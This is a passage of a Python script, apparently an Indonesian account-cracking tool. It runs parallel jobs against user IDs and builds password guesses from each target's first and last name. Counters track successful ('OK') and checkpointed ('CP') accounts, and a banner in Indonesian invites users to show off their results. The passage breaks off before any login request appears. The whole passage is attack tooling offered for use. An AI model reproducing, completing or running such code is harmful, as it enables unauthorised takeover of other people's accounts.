                    first = name.split(' ')
                    if len(first) == 3 or len(first) == 4 or len(first) == 5 or len(first) == 6:
                        pwx = pw
                    else:
                        pwx = pw
                        if 'validate' in mthd:
                            pool.submit(self.crack,validate,uid,name,pwx)
                        else:
                            pool.submit(self.crack,uid,name,pwx)
                except:pass

    def crack(self,uid,name,pwx):
        sys.stdout.write(f"\r*--> {str(self.loop)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}"),
        sys.stdout.flush()
        fn = name.split(' ')[0]
        try:ln = name.split(' ')[1]
        except:ln = fn
        for pw in pwx:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
            
if __name__ == "__main__":
   os.system('cls' if os.name == 'nt' else 'clear')
   AsepGantengPol(f"{H}GUNAKAN SCRIPT DENGAN BIJAK,SC INI GRATIS OPEN SOURCE,KALU DAPET IJO ATAU NGGA DAPET HASIL,TETEPLAH PAMER ANG ANG ANG,BIAR GW SEMANGAT UPDATE SC NYA {N}...")
   sleep(3)
   menu = Menu()
   menu.tampil_menu()